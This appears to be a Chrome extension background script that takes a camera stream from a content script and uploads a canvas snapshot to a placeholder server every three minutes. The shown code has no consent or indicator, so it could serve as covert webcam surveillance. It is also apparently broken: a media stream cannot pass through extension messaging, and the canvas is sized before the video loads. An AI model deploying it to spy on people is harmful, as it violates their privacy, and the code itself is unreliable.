// Constants
const SERVER_URL = "your-server-url";
const INTERVAL = 180 * 1000; // 3 minutes in milliseconds

// Receive the stream from the content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === "stream") {
    const stream = request.stream;

    // Create a video element to display the camera stream
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();

    // Create a canvas element to capture images
    const canvas = document.createElement("canvas");
    const context = canvas.getContext("2d");

    // Set the canvas size
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Send images to the server
    setInterval(() => {
      // Draw the video frame on the canvas
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Get the image data as a base64-encoded string
      const imageData = canvas.toDataURL();

      // Send the image data to the server
      fetch(SERVER_URL, {
        method: "POST",
        body: JSON.stringify({ image: imageData }),
        headers: { "Content-Type": "application/json" }
      })
        .then(response => {
          console.log("Image sent successfully");
        })
        .catch(error => {
          console.error("Failed to send image", error);
        });
    }, INTERVAL);
  }
});

